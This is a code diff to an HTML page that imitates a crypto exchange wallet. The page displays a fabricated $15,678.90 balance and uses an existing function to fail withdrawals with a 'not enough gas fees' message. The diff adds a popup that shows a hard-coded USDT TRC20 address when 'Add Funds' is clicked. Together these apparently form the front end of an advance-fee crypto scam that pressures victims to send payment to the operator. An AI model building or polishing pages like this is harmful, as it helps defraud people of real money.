@@ -19,12 +19,6 @@
     margin: auto;
   }
 
-  .top-bar {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 20px;
-  }
-
   .value-section h1 {
     font-size: 40px;
     font-weight: 700;
@@ -40,6 +34,7 @@
     margin-right: 10px;
     margin-top: 10px;
     cursor: pointer;
+    text-align: center;
   }
 
   .withdraw-btn {
@@ -141,6 +136,22 @@
     font-weight: 600;
   }
 
+  /* Notification Popup */
+  .notification {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #1ecb6c;
+    color: black;
+    padding: 15px 20px;
+    border-radius: 12px;
+    font-weight: 700;
+    display: none;
+    z-index: 9999;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  }
+
 </style>
 </head>
 
@@ -148,29 +159,20 @@
 
 <div class="container">
 
-  <!-- Top Section -->
-  <div class="top-bar">
-    <div style="font-size:22px; opacity:0.8;">8:09</div>
-    <div style="font-size:18px; background:#2a2b2e; padding:6px 10px; border-radius:8px;">100%</div>
-  </div>
-
   <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" width="48">
 
   <div class="value-section">
     <div style="opacity:0.7; margin-top:10px;">Est. Total Value 👁</div>
-
-    <!-- UPDATED BALANCE -->
     <h1>$15,678.90</h1>
   </div>
 
-  <div class="add-funds">Add Funds</div>
+  <!-- Add Funds Button -->
+  <div class="add-funds" id="addFundsBtn" onclick="showNotification()">Add Funds</div>
   <div class="withdraw-btn" onclick="openWalletModal()">Withdraw</div>
 
   <div class="watchlist-title">Watchlist • Coin</div>
 
-
-  <!-- FULL ORIGINAL COIN LIST (RESTORED COMPLETELY) -->
-
+  <!-- Coin list -->
   <div class="coin-row">
     <div class="coin-info">
       <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png">
@@ -283,7 +285,6 @@
     </div>
   </div>
 
-
 </div>
 
 <!-- Bottom Navigation -->
@@ -317,6 +318,11 @@
   </div>
 </div>
 
+<!-- Notification Popup -->
+<div class="notification" id="walletNotification">
+  USDT TRC20: TDShhkw8booYU8mDi2CBABBm8HkveD3PgS
+</div>
+
 <script>
 function openWalletModal() {
   document.getElementById("walletModal").style.display = "flex";
@@ -334,7 +340,18 @@ function failTransaction() {
   document.getElementById("errorMsg").innerHTML =
     "Transaction failed: Not enough gas fees for TRC20 transfer.";
 }
+
+// Show wallet address notification
+function showNotification() {
+  const notif = document.getElementById("walletNotification");
+  notif.style.display = "block";
+
+  // Hide after 5 seconds
+  setTimeout(() => {
+    notif.style.display = "none";
+  }, 5000);
+}
 </script>
 
 </body>
-  </html>
+</html>
